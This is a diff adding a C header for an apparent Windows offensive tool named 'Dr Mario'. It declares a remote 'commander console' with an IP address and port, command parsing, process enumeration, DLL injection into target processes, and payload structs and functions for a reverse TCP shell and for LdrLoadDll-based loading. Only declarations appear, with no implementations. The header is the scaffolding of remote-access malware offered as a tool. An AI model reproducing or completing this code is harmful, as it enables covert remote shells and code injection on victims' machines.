@@ -1,0 +1,128 @@
+#!name##DrMarioBase_H
+#!itemType##sfile
+#!info##Dr Mario base header file.
+#!lang##c
+
+#ifndef DR_MARIO_BASE_H
+#define DR_MARIO_BASE_H
+
+
+#define ROBBO_LOCUST
+#define ROBBO_TCP
+#include "robbo2.h"
+#include "drMario_help.h"
+
+#include <direct.h>
+
+#define DR_MARIO_CMD_CURRENT_DIR_BUFF 1024
+#define DR_MARIO_DEFAULT_DLL_NAME_BUFF 512
+
+extern HMODULE drMario_MAIN_MODULE;
+
+typedef struct _DR_MARIO_COMMANDER_CONSOLE {
+    int id;
+    char ip_addr[16];
+    int port_num;
+    WSADATA wsadata;
+    SOCKET main_sock;
+    struct sockaddr_in saddr;
+    HANDLE cmd_handle;
+    int FLAG_work;
+    int error;
+    char currentDir[DR_MARIO_CMD_CURRENT_DIR_BUFF];
+    void (*start)(struct _DR_MARIO_COMMANDER_CONSOLE *dr_mario);
+    void (*stop)(struct _DR_MARIO_COMMANDER_CONSOLE *dr_mario);
+
+} DR_MARIO_COMMANDER_CONSOLE, *pDR_MARIO_COMMANDER_CONSOLE;
+
+typedef struct _DR_MARIO_COMMANDER_MSG {
+    pROBBO_TCP_MESSAGES rmsg;
+    char *raw_cmd;
+    char *main_cmd;
+    char *dlimit;
+    char *arg1;
+    char *arg2;
+    char *arg3;
+    uint8_t types;
+    int is_file_FLAG;
+    char *landing_point;
+    pDR_MARIO_COMMANDER_CONSOLE console;
+    void (*clean)(struct _DR_MARIO_COMMANDER_MSG *cmsg);
+
+} DR_MARIO_COMMANDER_MSG, *pDR_MARIO_COMMANDER_MSG;
+
+typedef struct _DR_MARIO_PROC_PID_LIST {
+    DWORD *list;
+    int size;
+    void (*free)(struct _DR_MARIO_PROC_PID_LIST *pid_list);
+} DR_MARIO_PROC_PID_LIST, *pDR_MARIO_PROC_PID_LIST;
+
+
+// -------------------------------------------------------------------- PAYLOAD STRUCT --------------------------------------------------------------------
+
+typedef struct _DR_MARIO_PAYLOAD_MSGBOX {
+    int (*msgbox)(HWND, LPCSTR, LPCSTR, UINT);
+    void (*pause_me)(DWORD);
+    char label[32];
+    char text[256];
+} DR_MARIO_PAYLOAD_MSGBOX, *pDR_MARIO_PAYLOAD_MSGBOX;
+
+typedef struct _DR_MARIO_PAYLOAD_REVERSE_TCP {
+    WSADATA wsadata;
+    struct sockaddr_in sockaddr;
+    int sockaddr_size;
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    SOCKET sock;
+    char app_name[64];
+    Rtype_WSAStartup wsa_startup;
+    Rtype_WSASocketA wsa_socket;
+    Rtype_connect connect;
+    Rtype_closesocket close_sock;
+    RtypeCreateProcessA cr_proc;
+    RtypeWaitForSingleObject wait;
+} DR_MARIO_PAYLOAD_REVERSE_TCP, *pDR_MARIO_PAYLOAD_REVERSE_TCP;
+
+typedef struct _DR_MARIO_PAYLOAD_LDR_LOAD_DLL {
+    WCHAR dll_name[DR_MARIO_DEFAULT_DLL_NAME_BUFF];
+    UNICODE_STRING us_name;
+    HMODULE mod_handle;
+    ULONG flags;
+    SIZE_T data_size;
+    RtypeLdrLoadDll load_dll;
+} DR_MARIO_PAYLOAD_LDR_LOAD_DLL, *pDR_MARIO_PAYLOAD_LDR_LOAD_DLL;
+
+typedef struct _DR_MARIO_PAYLOAD_INJECT_DLL {
+    WCHAR dll_name[DR_MARIO_DEFAULT_DLL_NAME_BUFF];
+    UNICODE_STRING us_name;
+    HMODULE mod_handle;
+    ULONG flags;
+    SIZE_T data_size;
+    RtypeLdrLoadDll load_dll;
+    void* (*getAddr)(HMODULE, LPCSTR);
+    void (*exeFunc)(void);
+    char funcName[64];
+} DR_MARIO_PAYLOAD_INJECT_DLL, *pDR_MARIO_PAYLOAD_INJECT_DLL;
+
+// -------------------------------------------------------------------- Functions --------------------------------------------------------------------
+
+pDR_MARIO_COMMANDER_MSG drMario_make_commander_msg(pROBBO_TCP_MESSAGES rmsg, pDR_MARIO_COMMANDER_CONSOLE dr_mario);
+pDR_MARIO_PROC_PID_LIST drMario_get_pid_list(void);
+void drMario_get_proc_list(pDR_MARIO_COMMANDER_MSG cmsg);
+DWORD drMario_find_process_pid(char* proc_name);
+int drMario_inject_dll(char *dll_name, DWORD pid, int file_FLAG);
+int drMario_inject_dll2(char *dll_name, char *proc_name, int file_FLAG);
+char* drMario_get_dll_path(HMODULE mod_handle);
+int drMario_inject_run_dll(char *dll_name, DWORD target_pid, char *dll_func_name);
+
+
+// -------------------------------------------------------------------- Payload functions --------------------------------------------------------------------
+void WINAPI drMario_payload_func_msgbox(pDR_MARIO_PAYLOAD_MSGBOX payload);
+void WINAPI drMario_payload_func_msgbox_end(void);
+HANDLE WINAPI drMario_payload_func_ldr_load_dll(pDR_MARIO_PAYLOAD_LDR_LOAD_DLL payload);
+void WINAPI drMario_payload_func_ldr_load_dll_end(void);
+HANDLE WINAPI drMario_payload_func_rev_tcp(pDR_MARIO_PAYLOAD_REVERSE_TCP payload);
+void WINAPI drMario_payload_func_rev_tcp_end(void);
+void WINAPI drMario_payload_func_inject_run_dll(pDR_MARIO_PAYLOAD_INJECT_DLL payload);
+void WINAPI drMario_payload_func_inject_run_dll_end(void);
+#endif
